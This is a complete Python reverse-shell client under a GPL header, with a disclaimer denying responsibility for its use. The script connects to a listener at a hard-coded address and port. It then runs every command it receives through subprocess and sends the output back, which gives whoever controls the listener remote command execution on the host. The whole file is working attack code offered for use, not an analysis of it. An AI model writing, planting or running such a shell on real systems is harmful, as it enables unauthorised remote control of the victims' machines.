#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  AUTHOR IS NOT RESPONSIBLE FOR ANY CONSEQUENCES CAUSED BY USE
#  OF THIS PROGRAM
"""
client that connects back to listener
"""
import socket
import sys
import subprocess
               
        

def main():
    RADDR = '127.0.0.1'
    RPORT = 8890
    RHOST = (RADDR,RPORT)
    
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(RHOST)
        #s.send(b'hi im client\n')
        while True:            
            cmd = s.recv(1024).decode()
            if cmd == 'exit':
                break
            fb = subprocess.getoutput(cmd)#feedback after cmd                     
            s.send(fb.encode())
    except KeyboardInterrupt:
        s.close()        
    finally:
        s.close()


if __name__ == '__main__':
    main()
